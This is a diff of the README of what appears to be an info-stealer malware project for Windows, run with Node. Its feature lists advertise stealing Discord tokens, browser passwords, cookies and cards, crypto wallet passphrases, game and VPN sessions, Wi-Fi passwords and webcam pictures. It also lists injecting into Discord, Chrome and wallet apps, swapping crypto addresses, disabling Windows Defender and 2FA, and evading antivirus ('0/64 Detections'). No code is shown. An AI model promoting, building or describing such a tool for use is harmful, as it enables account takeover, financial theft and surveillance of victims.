@@ -57,34 +57,9 @@ node index.js
     - **Steal all viewed tokens Discord** (application and browsers) ✅
     - **Steal Info PC** (IP Address Public/Local, UUID, CPU, GPU), Windows Product Key, Windows Mac Address & Wifi Password(s) ✅
     - **Execution alerts (Injection) Discord** Changes (Pass, Mail, Username, Login, Added Card, Paypal, ~~Codes MFA2~~) ✅
-    - Steal Session **(Twitter, Steam Files/Session, Instagram, Roblox, Reddit, Telegram, Pigdin, TOX, ICQ)** 💜
-    - Steal **(Growtopia, Minecraft Files/Session)** 💜
-    - Steal **(Wallets App, Wallet Extensions)** 💜
-    - Inject Into **(Exodus, Atomic, Gmail, Discord)** 💜
-    - Crypto Address Swaper 💜
-    - Discord Token Grabber **(for all apps/browser(s))** 💜
-    - Steal Launcher **(Battlenet, Epicgame, RiotGames)** 💜
-    - Steal System Informations ALL 💜
-    - Anti Debug (Anti-VM/Anti Firewall) && **Debug Killer (CMD)** 💜
-    - Take a Screenshot 💜
-    - Steal in Other disk **USB/Network** 💜
-    - Steal **(Wifi Passwords & Latest Clipboard)** 💜
-    - Chromium Based Browsers **Extensions Injector** 💜
-    - Steal ANTIVIRUS installed 💜
-    - **Disable task Manager** 💜
-    - **Disable Windows Defender** 💜
-    - Add iself to startup 💜
-    - Steal **(Ubisoft, NationGlory Login)** 💜
-    - Steal **(OpenVPN, NordVPN ,ProtonVPN)** 💜
-    - Steal **(Exodus, Metamask Passphrase & Password)** 💜
-    - Open a Fake Error 💜
-    - Parse All **(Guilds/Servers Owner|Admin) & HQ Friends & HQ Bots & HQ Servers...** 💜
-    - Steal Sensitives Files & **(Passwords/Cookies/Credits cards/Autofill from All Browsers (Even Mozilla))** 💜
-    - Steal **(WinSCP, Filezilla, Putty, Shadow, Total-Commander, Steal Webcam Picture)** 💜
-    - Discord INJECTION **(2FA Disabler, Disable Discord Email Notification, Backups Codes, New(Passwords/Login/Credits/Emails))** 💜
-    - Discord INJECTION **Blocks the use of QR codes for login, Prevents requests to view devices** 💜
-    - Discord INJECTION Bypass Discord Update/Re-Install & (Bypass Better Discord | Token Protector)💜
-    - Chrome INJECTION Steal **(Cookies/History/Keylogger) & (Snipe Passwords & Steam Guard)** 💜
+    - **Exodus and Atomic (Injection)** 💜
+    - **Chrome and Mullvad VPN (Injection)** 💜
+    - **Stealer Game(s), File(s)** Steal all information from games like (Roblox, Minecraft), Also in case of files it steals all relevant files from the PC 💜
     - **Bot Builder & API** Bot to build the code and turn it into an executable with API etc. 💜
     - **0/64 Detections** Very difficult to be detected 💜
 
